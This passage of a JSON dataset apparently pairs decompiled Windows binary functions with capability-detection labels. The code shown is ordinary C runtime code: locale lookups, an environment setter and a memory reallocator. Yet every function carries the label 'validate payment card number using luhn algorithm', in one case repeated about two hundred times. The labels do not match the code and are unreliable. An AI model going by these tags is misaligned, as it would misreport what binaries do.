        "decompiled_code": "\nvoid fcn.00461bec(void)\n\n{\n    fcn.00461d1c(0x13, \"IsValidLocaleName\", 0x47b9c8, \"IsValidLocaleName\");\n    return;\n}\n",
        "token_count": 48
    },
    "00461c06": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461c06(void)\n\n{\n    fcn.00461d1c(0x15, \"LCIDToLocaleName\", 0x47b9ec, \"LCIDToLocaleName\");\n    return;\n}\n",
        "token_count": 52
    },
    "00461c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461c20(void)\n\n{\n    fcn.00461d1c(0x14, \"LCMapStringEx\", 0x47b9e4, 0x47b9ec);\n    return;\n}\n",
        "token_count": 53
    },
    "00461c3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461c3a(void)\n\n{\n    fcn.00461d1c(0x16, \"LocaleNameToLCID\", 0x47ba08, \"LocaleNameToLCID\");\n    return;\n}\n",
        "token_count": 52
    },
    "00466053": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466053(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00465fb2(arg_8h, arg_ch, fcn.004628e0, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "004668be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004668be(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00461626();\n    return iVar1 + 8;\n}\n",
        "token_count": 41
    },
    "00467d39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00467d39(char *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    char cVar1;\n    char cVar2;\n    code *pcVar3;\n    uint *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint uVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_8h == NULL) {\n        puVar4 = fcn.0045652e();\n        *puVar4 = 0x16;\n        return 0xffffffff;\n    }\n    pcVar5 = fcn.0046fdf0(arg_8h, 0x3d);\n    pcVar11 = arg_8h;\n    if ((pcVar5 == NULL) || (pcVar5 == arg_8h)) {\ncode_r0x00467bef:\n        puVar4 = fcn.0045652e();\n        *puVar4 = 0x16;\n        goto code_r0x00467bfa;\n    }\n    cVar1 = pcVar5[1];\n    fcn.00467cca();\n    uVar9 = 0;\n    if (*0x495cec == NULL) {\n        if ((arg_ch != 0) && (*0x495cf0 != 0)) {\n            iVar6 = fcn.0045f351();\n            if (iVar6 == 0) goto code_r0x00467bef;\n            fcn.00467cca();\n            goto code_r0x00467aac;\n        }\n        if (cVar1 == '\\0') {\n            uVar9 = 0;\n            goto code_r0x00467bfd;\n        }\n        *0x495cec = fcn.004626de(1, 4);\n        fcn.004612d2(0);\n        if (*0x495cec != NULL) {\n            if (*0x495cf0 == 0) {\n                *0x495cf0 = fcn.004626de(1, 4);\n                fcn.004612d2(0);\n                if (*0x495cf0 == 0) goto code_r0x00467bfa;\n            }\n            goto code_r0x00467aac;\n        }\n    }\n    else {\ncode_r0x00467aac:\n        piVar7 = *0x495cec;\n        if (*0x495cec != NULL) {\n            iVar6 = fcn.00467ce4(arg_8h, pcVar5 - arg_8h);\n            if ((-1 < iVar6) && (*piVar7 != 0)) {\n                fcn.004612d2(piVar7[iVar6]);\n                if (cVar1 == '\\0') {\n                    for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                        piVar7[iVar6] = piVar7[iVar6 + 1];\n                    }\n                    piVar7 = fcn.00467d44(piVar7, iVar6, 4);\n                    fcn.004612d2(0);\n                    if (piVar7 != NULL) {\ncode_r0x00467b74:\n                        *0x495cec = piVar7;\n                    }\n                }\n                else {\n                    pcVar11 = NULL;\n                    piVar7[iVar6] = arg_8h;\n                }\n                if (arg_ch != 0) {\n                    pcVar10 = arg_8h;\n                    do {\n                        cVar2 = *pcVar10;\n                        pcVar10 = pcVar10 + 1;\n                    } while (cVar2 != '\\0');\n                    iVar6 = fcn.004626de(pcVar10 + (2 - (arg_8h + 1)), 1);\n                    if (iVar6 != 0) {\n                        iVar8 = fcn.00461178(iVar6, pcVar10 + (2 - (arg_8h + 1)), arg_8h);\n                        if (iVar8 != 0) {\n                            fcn.00455a0a(0, 0, 0, 0, 0);\n                            pcVar3 = swi(3);\n                            uVar9 = (*pcVar3)();\n                            return uVar9;\n                        }\n                        (pcVar5 + (iVar6 - arg_8h) + 1)[-1] = '\\0';\n                        iVar8 = fcn.00466070(iVar6, -(cVar1 != '\\0') & pcVar5 + (iVar6 - arg_8h) + 1);\n                        if (iVar8 == 0) {\n                            puVar4 = fcn.0045652e();\n                            uVar9 = 0xffffffff;\n                            *puVar4 = 0x2a;\n                        }\n                    }\n                    fcn.004612d2(iVar6);\n                }\n                goto code_r0x00467bfd;\n            }\n            if (cVar1 == '\\0') goto code_r0x00467bfd;\n            arg_ch_00 = -iVar6 + 2;\n            if ((-iVar6 <= arg_ch_00) && (arg_ch_00 < 0x3fffffff)) {\n                piVar7 = fcn.00467d44(piVar7, arg_ch_00, 4);\n                fcn.004612d2(0);\n                if (piVar7 != NULL) {\n                    piVar7[-iVar6] = arg_8h;\n                    piVar7[1 - iVar6] = 0;\n                    pcVar11 = NULL;\n                    goto code_r0x00467b74;\n                }\n            }\n        }\n    }\ncode_r0x00467bfa:\n    uVar9 = 0xffffffff;\ncode_r0x00467bfd:\n    fcn.004612d2(pcVar11);\n    return uVar9;\n}\n",
        "token_count": 1327
    },
    "00467d44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00467d44(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.0046e442(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.00462d63(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.00452000(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.0045652e();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 249
    },
    "0046b5d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b5d9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_2c8h;\n    \n    fcn.0046b79b(arg_8h, arg_ch);\n    fcn.0046b79b(arg_10h, arg_14h);\n    fcn.00465585();\n    fcn.0046b61a();\n    return;\n}\n",
        "token_count": 104
    },
    "0046b768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b768(uint arg_8h, uint arg_ch)\n\n{\n    uint var_2c8h;\n    \n    fcn.0046b79b(arg_8h, arg_ch);\n    fcn.00465510();\n    fcn.0046b61a();\n    return;\n}\n",
        "token_count": 71
    },
    "0046b79b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nfloat10 __cdecl fcn.0046b79b(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    float10 fVar1;\n    uint var_ah;\n    uint var_6h;\n    uint var_2h;\n    \n    if ((arg_ch._2_2_ & 0x7ff0) == 0x7ff0) {\n        fVar1 = CONCAT28(arg_ch._2_2_, CONCAT44(arg_ch << 0xb | arg_8h >> 0x15, arg_8h)) | 0x7fff;\n    }\n    else {\n        fVar1 = CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h));\n    }\n    return fVar1;\n}\n",
        "token_count": 182
    },
    "0046dcdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0046dcdb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0043b410(0x48f3b8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00456afa(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0046dc33(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0046dc2a();\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 253
    },
    "0045108f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
